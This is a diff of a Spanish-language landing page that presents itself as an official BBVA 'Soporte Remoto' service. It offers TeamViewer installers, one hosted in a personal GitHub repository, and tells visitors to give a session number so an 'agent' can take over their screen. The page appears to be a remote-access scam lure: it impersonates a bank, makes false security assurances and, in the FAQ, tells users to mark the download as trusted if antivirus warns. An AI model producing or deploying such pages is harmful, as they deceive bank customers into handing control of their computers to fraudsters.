@@ -14,44 +14,38 @@
 </head>
 <body>
 
-    <!-- Fondo global -->
     <div class="bg" aria-hidden="true">
         <div class="bg__aurora bg__aurora--1"></div>
         <div class="bg__aurora bg__aurora--2"></div>
-        <div class="bg__grid"></div>
-        <canvas id="particles"></canvas>
+        <div class="bg__noise"></div>
     </div>
     <div class="spotlight" id="spotlight" aria-hidden="true"></div>
 
-    <!-- ============ NAV FLOTANTE ============ -->
+    <!-- ============ CABECERA ============ -->
     <header class="site-header" id="header">
-        <div class="nav-pill">
+        <div class="container site-header__inner">
             <a href="#" class="brand" aria-label="BBVA Soporte Remoto">
                 <span class="brand__logo">BBVA</span>
                 <span class="brand__sub">Soporte&nbsp;Remoto</span>
             </a>
             <nav class="nav" aria-label="Navegación principal">
                 <a href="#descargas" class="nav__link">Descargas</a>
-                <a href="#seguridad" class="nav__link">Seguridad</a>
                 <a href="#como-funciona" class="nav__link">Cómo funciona</a>
+                <a href="#privacidad" class="nav__link">Privacidad</a>
                 <a href="#faq" class="nav__link">FAQ</a>
             </nav>
-            <a href="#descargas" class="btn btn--primary btn--sm nav__cta">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/><path d="M4 21h16"/></svg>
-                Descargar
-            </a>
+            <a href="#descargas" class="btn btn--primary btn--sm nav__cta">Descargar</a>
             <button class="burger" id="burger" aria-label="Abrir menú" aria-expanded="false" aria-controls="mobile-menu">
                 <span></span><span></span>
             </button>
         </div>
     </header>
 
-    <!-- Menú móvil -->
     <div class="mobile-menu" id="mobile-menu" aria-hidden="true">
         <nav class="mobile-menu__links" aria-label="Navegación móvil">
             <a href="#descargas">Descargas</a>
-            <a href="#seguridad">Seguridad</a>
             <a href="#como-funciona">Cómo funciona</a>
+            <a href="#privacidad">Privacidad</a>
             <a href="#faq">FAQ</a>
         </nav>
         <a href="downloads/TeamViewer_Setup_x64.exe" download class="btn btn--primary btn--lg mobile-menu__cta" id="mobile-menu-cta">
@@ -61,193 +55,55 @@
 
     <main>
 
-        <!-- ============ HERO ============ -->
+        <!-- ============ PORTADA ============ -->
         <section class="hero">
             <div class="container hero__inner">
-                <span class="pill reveal">
-                    <span class="pill__dot"></span>
-                    Herramienta oficial de asistencia BBVA
-                </span>
-                <h1 class="hero__title reveal">
-                    Soporte remoto<br>
-                    <span class="text-gradient">en segundos.</span>
-                </h1>
-                <p class="hero__lead reveal">
-                    Descarga la herramienta oficial de asistencia de BBVA y permite que un
-                    agente especializado resuelva tu incidencia de forma segura.
-                    Sin registros, sin complicaciones.
-                </p>
-
-                <div class="hero__actions reveal">
-                    <a href="downloads/TeamViewer_Setup_x64.exe" download class="btn btn--primary btn--lg" id="dl-primary">
-                        <span class="btn__icon" id="dl-primary-icon">
-                            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>
-                        </span>
-                        <span id="dl-primary-text">Descargar para Windows</span>
-                    </a>
-                    <a href="https://github.com/cdxw46/websitepruebasparakimibbva/releases/latest/download/TeamViewer.dmg" download class="btn btn--ghost btn--lg" id="dl-secondary">
-                        <span class="btn__icon" id="dl-secondary-icon">
-                            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>
-                        </span>
-                        <span id="dl-secondary-text">Descargar para macOS</span>
-                    </a>
+                <div class="hero__copy">
+                    <span class="pill reveal">
+                        <span class="pill__dot"></span>
+                        Asistencia oficial BBVA
+                    </span>
+                    <h1 class="hero__title reveal">
+                        Te ayudamos<br>
+                        <span class="text-gradient">a distancia.</span>
+                    </h1>
+                    <p class="hero__lead reveal">
+                        Un agente especializado se conecta a tu equipo de forma segura
+                        y resuelve tu incidencia mientras tú miras. Así de fácil.
+                    </p>
+                    <div class="hero__actions reveal">
+                        <a href="#descargas" class="btn btn--primary btn--lg" id="dl-primary">
+                            <span class="btn__icon" id="dl-primary-icon">
+                                <svg viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>
+                            </span>
+                            <span id="dl-primary-text">Descargar para Windows</span>
+                        </a>
+                        <a href="#como-funciona" class="btn btn--ghost btn--lg">¿Cómo funciona?</a>
+                    </div>
+                    <p class="hero__note reveal">Gratis · Sin registro · Para Windows y Mac</p>
                 </div>
 
-                <ul class="hero__meta reveal">
-                    <li>
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l7 3v5c0 4.6-3.1 8.4-7 10-3.9-1.6-7-5.4-7-10V6l7-3z"/><path d="M9 12l2 2 4-4"/></svg>
-                        Cifrado AES-256
-                    </li>
-                    <li>
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 3"/></svg>
-                        Sin registro
-                    </li>
-                    <li>
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="13" rx="2"/><path d="M8 21h8m-4-4v4"/></svg>
-                        Windows y macOS
-                    </li>
-                </ul>
-            </div>
-
-            <!-- Preview 3D de la app -->
-            <div class="container preview-wrap reveal">
-                <div class="preview" id="preview">
-                    <div class="preview__glow" aria-hidden="true"></div>
-                    <div class="app-window">
-                        <div class="app-window__bar">
-                            <span class="dot dot--red"></span>
-                            <span class="dot dot--yellow"></span>
-                            <span class="dot dot--green"></span>
-                            <span class="app-window__title">BBVA Soporte Remoto</span>
+                <!-- Arte abstracto: órbitas -->
+                <div class="hero__art reveal" id="hero-art" aria-hidden="true">
+                    <div class="orbit">
+                        <span class="orbit__ring orbit__ring--1"></span>
+                        <span class="orbit__ring orbit__ring--2"></span>
+                        <span class="orbit__ring orbit__ring--3"></span>
+                        <div class="orbit__core">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><path d="M3 13a9 9 0 0118 0"/><rect x="2" y="13" width="5" height="7" rx="2"/><rect x="17" y="13" width="5" height="7" rx="2"/><path d="M21 20a4 4 0 01-4 2h-3"/></svg>
                         </div>
-                        <div class="app-window__body">
-                            <div class="status">
-                                <span class="status__pulse"></span>
-                                <span class="status__text">Listo para conectar</span>
-                            </div>
-                            <p class="app-window__label">Tu código de sesión</p>
-                            <div class="session-code" aria-label="Código de sesión de ejemplo">
-                                <span>4 8 2</span><i></i><span>9 1 3</span><i></i><span>6 5 7</span>
-                            </div>
-                            <p class="app-window__hint">Facilita este código a tu agente BBVA</p>
-                            <div class="app-window__footer">
-                                <div class="mini-info">
-                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 018 0v3"/></svg>
-                                    Sesión cifrada · TLS 1.3
-                                </div>
-                            </div>
+                        <div class="os-chip os-chip--win">
+                            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>
+                        </div>
+                        <div class="os-chip os-chip--mac">
+                            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>
+                        </div>
+                        <div class="orbit__status">
+                            <span class="orbit__status-dot"></span>
+                            Agente en línea
                         </div>
                     </div>
                 </div>
-            </div>
-        </section>
-
-        <!-- ============ MARQUESINA ============ -->
-        <div class="marquee" aria-hidden="true">
-            <div class="marquee__track">
-                <span>Cifrado extremo a extremo</span><i>◆</i>
-                <span>Soporte 24/7</span><i>◆</i>
-                <span>Sin registro</span><i>◆</i>
-                <span>Códigos de un solo uso</span><i>◆</i>
-                <span>Windows y macOS</span><i>◆</i>
-                <span>Cifrado extremo a extremo</span><i>◆</i>
-                <span>Soporte 24/7</span><i>◆</i>
-                <span>Sin registro</span><i>◆</i>
-                <span>Códigos de un solo uso</span><i>◆</i>
-                <span>Windows y macOS</span><i>◆</i>
-            </div>
-        </div>
-
-        <!-- ============ SEGURIDAD (BENTO) ============ -->
-        <section class="section" id="seguridad">
-            <div class="container">
-                <div class="section__head reveal">
-                    <span class="eyebrow">Seguridad</span>
-                    <h2>Diseñado para protegerte</h2>
-                    <p>Cada sesión cumple los estándares de seguridad bancaria más exigentes.</p>
-                </div>
-
-                <div class="bento">
-                    <article class="bento__card bento__card--big reveal">
-                        <div class="lock-visual" aria-hidden="true">
-                            <span class="ring ring--1"></span>
-                            <span class="ring ring--2"></span>
-                            <span class="ring ring--3"></span>
-                            <div class="lock-core">
-                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="10" rx="2"/><path d="M8 10V7a4 4 0 018 0v3"/></svg>
-                            </div>
-                        </div>
-                        <div class="bento__text">
-                            <h3>Cifrado de grado bancario</h3>
-                            <p>Toda la comunicación viaja cifrada de extremo a extremo con TLS 1.3 y AES-256. Nadie — ni siquiera nosotros — puede interceptar lo que ocurre en tu sesión.</p>
-                        </div>
-                    </article>
-
-                    <article class="bento__card bento__card--wide reveal">
-                        <div class="bento__text">
-                            <h3>Códigos de un solo uso</h3>
-                            <p>Cada sesión genera un código único que caduca al finalizar. Sin accesos permanentes ni puertas traseras.</p>
-                        </div>
-                        <div class="code-chip" aria-hidden="true">
-                            <span class="code-chip__digits">4 8 2 · 9 1 3 · 6 5 7</span>
-                            <span class="code-chip__tag">caduca al cerrar</span>
-                        </div>
-                    </article>
-
-                    <article class="bento__card reveal">
-                        <div class="bento__icon">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>
-                        </div>
-                        <h3>Control total</h3>
-                        <p>Ves todo lo que hace el agente y puedes finalizar la conexión en cualquier momento.</p>
-                    </article>
-
-                    <article class="bento__card reveal">
-                        <div class="bento__icon">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z"/><path d="M14 2v6h6"/><path d="M9 15l2 2 4-4"/></svg>
-                        </div>
-                        <h3>Auditoría completa</h3>
-                        <p>Cada sesión queda registrada conforme a la normativa de protección de datos.</p>
-                    </article>
-                </div>
-            </div>
-        </section>
-
-        <!-- ============ CÓMO FUNCIONA ============ -->
-        <section class="section section--steps" id="como-funciona">
-            <div class="container">
-                <div class="section__head reveal">
-                    <span class="eyebrow">Proceso</span>
-                    <h2>Así de sencillo</h2>
-                    <p>En menos de un minuto estarás conectado con un agente especializado.</p>
-                </div>
-
-                <ol class="steps">
-                    <li class="step reveal">
-                        <span class="step__ghost" aria-hidden="true">01</span>
-                        <div class="step__icon">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/><path d="M4 21h16"/></svg>
-                        </div>
-                        <h3>Descarga</h3>
-                        <p>Elige tu sistema operativo y descarga el archivo. Es ligero y no requiere permisos de administrador.</p>
-                    </li>
-                    <li class="step reveal">
-                        <span class="step__ghost" aria-hidden="true">02</span>
-                        <div class="step__icon">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M5 3l14 9-14 9V3z"/></svg>
-                        </div>
-                        <h3>Ejecuta</h3>
-                        <p>Ábrelo directamente. La aplicación se inicia al momento y genera tu código de sesión único.</p>
-                    </li>
-                    <li class="step reveal">
-                        <span class="step__ghost" aria-hidden="true">03</span>
-                        <div class="step__icon">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z"/></svg>
-                        </div>
-                        <h3>Comparte</h3>
-                        <p>Facilita tu código al agente BBVA. Tú controlas la conexión en todo momento.</p>
-                    </li>
-                </ol>
             </div>
         </section>
 
@@ -256,61 +112,132 @@
             <div class="container">
                 <div class="section__head reveal">
                     <span class="eyebrow">Descargas</span>
-                    <h2>Elige tu plataforma</h2>
-                    <p>Disponible para ordenadores Windows y Mac. Misma seguridad, mismo rendimiento.</p>
+                    <h2>Elige tu equipo</h2>
+                    <p>Un solo clic y lo tienes. El archivo pesa poco y se abre al momento.</p>
                 </div>
 
                 <div class="cards">
                     <article class="card reveal" data-os="windows">
-                        <span class="card__badge" hidden>Recomendado para tu equipo</span>
+                        <span class="card__badge" hidden>Detectado en tu equipo</span>
                         <div class="card__icon">
                             <svg viewBox="0 0 24 24" fill="currentColor"><path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/></svg>
                         </div>
                         <h3>Windows</h3>
-                        <p class="card__meta">Windows 10 / 11 · 64 bits</p>
-                        <div class="card__file">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z"/><path d="M14 2v6h6"/></svg>
-                            <span>TeamViewer_Setup_x64.exe</span>
-                            <em>80,1 MB</em>
-                        </div>
+                        <p class="card__meta">Windows 10 y 11 · 64 bits · 80,1 MB</p>
                         <a href="downloads/TeamViewer_Setup_x64.exe" download class="btn btn--primary btn--card">
                             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/><path d="M4 21h16"/></svg>
-                            Descargar .exe
+                            Descargar gratis
                         </a>
                     </article>
 
                     <article class="card reveal" data-os="macos">
-                        <span class="card__badge" hidden>Recomendado para tu equipo</span>
+                        <span class="card__badge" hidden>Detectado en tu equipo</span>
                         <div class="card__icon">
                             <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.519 12.09 1.013 1.454 2.208 3.09 3.792 3.039 1.52-.065 2.09-.987 3.935-.987 1.831 0 2.35.987 3.96.948 1.637-.026 2.676-1.48 3.676-2.948 1.156-1.688 1.636-3.325 1.662-3.415-.039-.013-3.182-1.221-3.22-4.857-.026-3.04 2.48-4.494 2.597-4.559-1.429-2.09-3.623-2.324-4.39-2.376-2-.156-3.675 1.09-4.61 1.09zM15.53 3.83c.843-1.012 1.4-2.427 1.245-3.83-1.207.052-2.662.805-3.532 1.818-.78.896-1.454 2.338-1.273 3.714 1.338.104 2.715-.688 3.559-1.701"/></svg>
                         </div>
-                        <h3>macOS</h3>
-                        <p class="card__meta">macOS 12 o superior · Universal</p>
-                        <div class="card__file">
-                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z"/><path d="M14 2v6h6"/></svg>
-                            <span>TeamViewer.dmg</span>
-                            <em>118,5 MB</em>
-                        </div>
+                        <h3>Mac</h3>
+                        <p class="card__meta">macOS 12 o superior · 118,5 MB</p>
                         <a href="https://github.com/cdxw46/websitepruebasparakimibbva/releases/latest/download/TeamViewer.dmg" download class="btn btn--primary btn--card">
                             <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/><path d="M4 21h16"/></svg>
-                            Descargar .dmg
+                            Descargar gratis
                         </a>
                     </article>
                 </div>
+            </div>
+        </section>
 
-                <div class="stats reveal">
-                    <div class="stat">
-                        <span class="stat__value"><span class="counter" data-target="30">0</span>&nbsp;s</span>
-                        <span class="stat__label">Tiempo medio de conexión</span>
+        <!-- ============ CÓMO FUNCIONA (línea temporal) ============ -->
+        <section class="section" id="como-funciona">
+            <div class="container container--narrow">
+                <div class="section__head reveal">
+                    <span class="eyebrow">Paso a paso</span>
+                    <h2>En un minuto, conectado</h2>
+                </div>
+
+                <ol class="timeline">
+                    <li class="timeline__item reveal">
+                        <span class="timeline__node">1</span>
+                        <div class="timeline__card">
+                            <h3>Descarga la herramienta</h3>
+                            <p>Pulsa el botón de tu equipo y guarda el archivo. No necesitas permisos de administrador.</p>
+                        </div>
+                    </li>
+                    <li class="timeline__item reveal">
+                        <span class="timeline__node">2</span>
+                        <div class="timeline__card">
+                            <h3>Abre el archivo</h3>
+                            <p>Se inicia al momento y te muestra un número de sesión. No hay nada más que configurar.</p>
+                        </div>
+                    </li>
+                    <li class="timeline__item reveal">
+                        <span class="timeline__node">3</span>
+                        <div class="timeline__card">
+                            <h3>Di el número a tu agente</h3>
+                            <p>Con ese número, el agente de BBVA se conecta a tu pantalla. Tú ves todo y puedes cortar cuando quieras.</p>
+                        </div>
+                    </li>
+                </ol>
+            </div>
+        </section>
+
+        <!-- ============ PRIVACIDAD ============ -->
+        <section class="section" id="privacidad">
+            <div class="container privacy">
+                <div class="privacy__copy reveal">
+                    <span class="eyebrow">Privacidad</span>
+                    <h2>Tu privacidad, primero</h2>
+                    <p class="privacy__lead">
+                        La conexión solo se abre cuando tú la autorizas y se cierra
+                        para siempre al terminar. Sin letra pequeña.
+                    </p>
+                    <ul class="privacy__list">
+                        <li>
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+                            Conexión cifrada de extremo a extremo
+                        </li>
+                        <li>
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+                            El acceso caduca al terminar la sesión
+                        </li>
+                        <li>
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+                            Tú ves todo lo que hace el agente
+                        </li>
+                        <li>
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+                            Cumple la normativa de protección de datos
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="privacy__art reveal" aria-hidden="true">
+                    <div class="shield">
+                        <span class="shield__halo shield__halo--1"></span>
+                        <span class="shield__halo shield__halo--2"></span>
+                        <div class="shield__core">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l7 3v5c0 4.6-3.1 8.4-7 10-3.9-1.6-7-5.4-7-10V6l7-3z"/><path d="M9 12l2 2 4-4"/></svg>
+                        </div>
                     </div>
-                    <div class="stat">
-                        <span class="stat__value"><span class="counter" data-target="256">0</span>&nbsp;bit</span>
-                        <span class="stat__label">Cifrado AES de grado bancario</span>
-                    </div>
-                    <div class="stat">
-                        <span class="stat__value"><span class="counter" data-target="24">0</span>/7</span>
-                        <span class="stat__label">Disponibilidad del servicio</span>
-                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ============ CIFRAS ============ -->
+        <section class="band reveal">
+            <div class="container band__inner">
+                <div class="band__item">
+                    <span class="band__value"><span class="counter" data-target="30">0</span> s</span>
+                    <span class="band__label">en conectar</span>
+                </div>
+                <div class="band__divider"></div>
+                <div class="band__item">
+                    <span class="band__value"><span class="counter" data-target="15">0</span> min</span>
+                    <span class="band__label">duración media</span>
+                </div>
+                <div class="band__divider"></div>
+                <div class="band__item">
+                    <span class="band__value"><span class="counter" data-target="24">0</span>/7</span>
+                    <span class="band__label">siempre disponible</span>
                 </div>
             </div>
         </section>
@@ -319,36 +246,36 @@
         <section class="section" id="faq">
             <div class="container container--narrow">
                 <div class="section__head reveal">
-                    <span class="eyebrow">Ayuda</span>
+                    <span class="eyebrow">Dudas</span>
                     <h2>Preguntas frecuentes</h2>
                 </div>
 
                 <div class="faq">
                     <details class="faq__item reveal">
                         <summary>
-                            ¿Es seguro compartir mi pantalla con BBVA?
+                            ¿Es seguro?
                             <span class="faq__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg></span>
                         </summary>
                         <div class="faq__answer">
-                            <p>Sí. La conexión está cifrada de extremo a extremo y solo se establece cuando tú facilitas el código de sesión a un agente. Puedes finalizar la sesión en cualquier momento cerrando la aplicación.</p>
+                            <p>Sí. La conexión va cifrada de extremo a extremo y solo se abre cuando tú das tu número de sesión a un agente. Puedes cerrarla en cualquier momento.</p>
                         </div>
                     </details>
                     <details class="faq__item reveal">
                         <summary>
-                            ¿Necesito instalar algo en mi equipo?
+                            ¿Tengo que pagar algo o registrarme?
                             <span class="faq__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg></span>
                         </summary>
                         <div class="faq__answer">
-                            <p>El asistente de instalación te guiará en menos de un minuto. Una vez finalizada la sesión de soporte, puedes desinstalarlo sin dejar rastro en tu equipo.</p>
+                            <p>No. Es un servicio gratuito de asistencia de BBVA y no requiere ningún tipo de registro.</p>
                         </div>
                     </details>
                     <details class="faq__item reveal">
                         <summary>
-                            ¿Cuánto dura una sesión de soporte?
+                            ¿El agente puede entrar cuando quiera?
                             <span class="faq__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg></span>
                         </summary>
                         <div class="faq__answer">
-                            <p>Depende de la incidencia, pero la mayoría de las sesiones se resuelven en menos de 15 minutos. El código de sesión caduca automáticamente al terminar.</p>
+                            <p>No. Sin tu número de sesión nadie puede conectarse, y ese número deja de funcionar en cuanto termina la asistencia.</p>
                         </div>
                     </details>
                     <details class="faq__item reveal">
@@ -357,7 +284,7 @@
                             <span class="faq__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg></span>
                         </summary>
                         <div class="faq__answer">
-                            <p>El software está firmado digitalmente. Si tu antivirus muestra un aviso, verifica que la descarga procede de esta página oficial y marca el archivo como de confianza.</p>
+                            <p>El programa está firmado digitalmente. Si tu antivirus avisa, comprueba que la descarga procede de esta página oficial y márcala como de confianza.</p>
                         </div>
                     </details>
                 </div>
@@ -369,12 +296,9 @@
             <div class="container">
                 <div class="cta__box reveal">
                     <div class="cta__glow" aria-hidden="true"></div>
-                    <h2>¿Necesitas ayuda ahora mismo?</h2>
-                    <p>Descarga la herramienta y un agente especializado te asistirá en minutos.</p>
-                    <a href="#descargas" class="btn btn--primary btn--lg">
-                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v12m0 0l-4-4m4 4l4-4"/><path d="M4 21h16"/></svg>
-                        Descargar ahora
-                    </a>
+                    <h2>¿Te ayudamos ahora?</h2>
+                    <p>Descarga la herramienta y ten a un agente contigo en minutos.</p>
+                    <a href="#descargas" class="btn btn--primary btn--lg">Descargar ahora</a>
                 </div>
             </div>
         </section>
@@ -382,32 +306,18 @@
     </main>
 
     <footer class="footer">
-        <div class="container footer__grid">
+        <div class="container footer__inner">
             <div class="footer__brand">
                 <span class="brand__logo">BBVA</span>
-                <p>Herramienta oficial de asistencia remota para clientes y empleados de BBVA.</p>
+                <span class="footer__tag">Soporte Remoto</span>
             </div>
-            <nav class="footer__col" aria-label="Producto">
-                <h4>Producto</h4>
+            <nav class="footer__links" aria-label="Enlaces del pie">
                 <a href="#descargas">Descargas</a>
                 <a href="#como-funciona">Cómo funciona</a>
-                <a href="#seguridad">Seguridad</a>
+                <a href="#privacidad">Privacidad</a>
+                <a href="#faq">FAQ</a>
             </nav>
-            <nav class="footer__col" aria-label="Soporte">
-                <h4>Soporte</h4>
-                <a href="#faq">Preguntas frecuentes</a>
-                <a href="#">Contacto</a>
-                <a href="#">Estado del servicio</a>
-            </nav>
-            <nav class="footer__col" aria-label="Legal">
-                <h4>Legal</h4>
-                <a href="#">Aviso legal</a>
-                <a href="#">Privacidad</a>
-                <a href="#">Cookies</a>
-            </nav>
-        </div>
-        <div class="container footer__bottom">
-            <p>© <span id="year">2026</span> Banco Bilbao Vizcaya Argentaria, S.A. Todos los derechos reservados.</p>
+            <p class="footer__legal">© <span id="year">2026</span> Banco Bilbao Vizcaya Argentaria, S.A.</p>
         </div>
     </footer>
 
